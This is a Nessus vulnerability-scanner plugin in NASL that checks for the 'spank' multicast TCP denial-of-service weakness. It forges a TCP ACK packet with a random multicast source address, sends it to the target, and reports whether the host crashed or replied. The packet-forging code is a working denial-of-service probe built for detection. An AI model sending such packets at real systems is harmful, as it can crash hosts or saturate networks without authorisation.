#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
  script_id(11901);
  script_version ("$Revision: 1.20 $");
  script_cvs_date("$Date: 2017/03/02 17:44:46 $");

  script_name(english:"TCP/IP Multicast Address Handling Remote DoS (spank.c)");
  script_summary(english:"Sends a TCP packet from a multicast address.");

  script_set_attribute(attribute:"synopsis", value:
"The remote host responds to TCP packets that are coming from a
multicast IP address.");
  script_set_attribute(attribute:"description", value:
"Nessus has detected that the remote host responds to TCP packets
that are coming from a multicast IP address. An attacker can exploit
this to conduct a 'spank' denial of service attack, resulting in the
host being shut down or network traffic reaching saturation. Also,
this vulnerability can be used by an attacker to conduct stealth port
scans against the host.");
  script_set_attribute(attribute:"solution", value:
"Contact your operating system vendor for a patch. Alternatively,
filter out multicast IP addresses (224.0.0.0/4).");
  script_set_cvss_base_vector("CVSS2#AV:A/AC:L/Au:N/C:N/I:N/A:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H");

  script_set_attribute(attribute:"plugin_publication_date", value: "2003/10/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_KILL_HOST); # Some IP stacks are crashed by this attack
  script_family(english:"Denial of Service");

  script_copyright(english:"This script is Copyright (C) 2003-2017 Tenable Network Security, Inc.");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");

# We could use a better pcap filter to avoid a false positive... 
if (islocalhost()) audit(AUDIT_LOCALHOST);
if (TARGET_IS_IPV6) audit(AUDIT_ONLY_IPV4);

dest = get_host_ip();

a = 224 +  rand() % 16;
b = rand() % 256;
c = rand() % 256;
d = rand() % 256;
src = strcat(a, ".", b, ".", c, ".", d);

joined = join_multicast_group(src);

if (!joined && !islocalnet())
{
  err = "Target host is not on the same subnet, and " +
        "multicast group could not be joined.";
  exit(0, err);
}

# Either we need to upgrade libnasl, or multicast is not 
# supported on this host / network
# If we are on the same network, the script may work, otherwise, the chances
# are very small -- only if we are on the way to the default multicast
# gateway

start_denial();

id = rand() % 65536;
seq = rand();
ack = rand();

sport = rand() % 64512 + 1024;
dport = get_host_open_port();
if (!dport) dport = rand() % 65535 + 1;

ip = forge_ip_packet(
  ip_v   : 4,
  ip_hl  : 5,
  ip_tos : 0x08,
  ip_len : 20,
  ip_id  : id,
  ip_p   : IPPROTO_TCP,
  ip_ttl : 255,
  ip_off : 0,
  ip_src : src
);

tcpip = forge_tcp_packet(
  ip       : ip,
  th_sport : sport,
  th_dport : dport,
  th_flags : TH_ACK,
  th_seq   : seq,
  th_ack   : 0,
  th_x2    : 0,
  th_off   : 5,
  th_win   : 2048,
  th_urp   : 0
);

pf = strcat("tcp and src host ", dest, " and dst host ", src);

ok = FALSE;
for (i = 0; i < 3 && !ok; i++)
{
  r = send_packet(tcpip, pcap_active:TRUE, pcap_filter: pf);
  if (r) ok = TRUE;
}

alive = end_denial();

if (!isnull(alive) && !alive)
{
  set_kb_item(name:"Host/dead", value:TRUE);
  security_report_v4(port:dport, severity:SECURITY_WARNING);
}
else if (ok)
{
  report = '\n' +
           'Although the machine did not crash, it answered by ' +
           'sending back a multicast TCP packet.';
  security_report_v4(port:dport, extra:report, severity:SECURITY_WARNING);
}
else
  audit(AUDIT_HOST_NOT, "affected");
